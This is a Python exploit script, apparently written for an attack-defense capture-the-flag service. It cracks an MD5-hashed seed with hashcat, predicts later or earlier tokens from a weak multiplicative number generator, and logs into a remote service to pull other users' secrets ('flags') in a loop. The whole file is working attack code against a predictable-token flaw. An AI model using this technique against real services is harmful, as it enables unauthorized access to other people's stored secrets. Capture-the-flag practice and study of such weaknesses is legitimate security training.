#!/usr/bin/env python3

from hashlib import md5
from struct  import pack
import pwn
import sys

FILENAME = "value.txt"
# to get value: 1. hashcat -m 0 -a 3 token_value ?b?b?b?b
#               2. struct.unpack("I", bytes.fromhex(hex_from_hashcat))[0] in python3
USERNAME = "testusername"
PWD = "qwerty"
IP = ''
PORT = 9091
MODE = 0
# MODE = 0 - read new secrets from start value
# MODE = 1 - read old secrets from start value


def next(value):
    return (value * 0xd34dc0d3) % 2 ** 32


def prev(value):
    # 0xbae0975b = (0xd34dc0d3 ** (-1)) % 2 ** 32
    return (value * 0xbae0975b) % 2 ** 32


def get_token(value):
    return md5(pack("I", value)).hexdigest()


def read_secret(io, token):
    io.recvuntil("|\n-----------------------------------------------------------\n")

    io.sendline("1")
    io.recvuntil("login:")
    io.sendline(USERNAME)
    io.recvuntil("password:")
    io.sendline(PWD)

    io.sendline("2")
    io.recvuntil("login:")
    io.sendline(USERNAME)
    io.recvuntil("password:")
    io.sendline(PWD)

    io.recvuntil("|\n-----------------------------------------------------------\n")
    io.sendline("4")
    io.recvline()
    io.sendline(token)

    return io.recvline().decode().split()[-1]


def get_flags():
    if MODE:
        next_value = prev
        prev_value = next
    else:
        next_value = next
        prev_value = prev

    f = open(FILENAME, 'r+')
    value = next_value(int(f.read().strip()))
    token = get_token(value)

    try:
        io = pwn.remote(IP, PORT, level = 60)
        reseved = read_secret(io, token)
        while reseved != "sorry":
            sys.stdout.write(reseved + '\n')
            value = next_value(value)
            token = get_token(value)
            reseved = read_secret(io, token)

        f.seek(0)
        f.write(str(prev_value(value)))

    except EOFError:
        print("EOFError while recv smth")
    except pwn.PwnlibException as e:
        print("Failed to connect: {}".format(e))


if __name__ == "__main__":
    IP = sys.argv[1]
    get_flags()
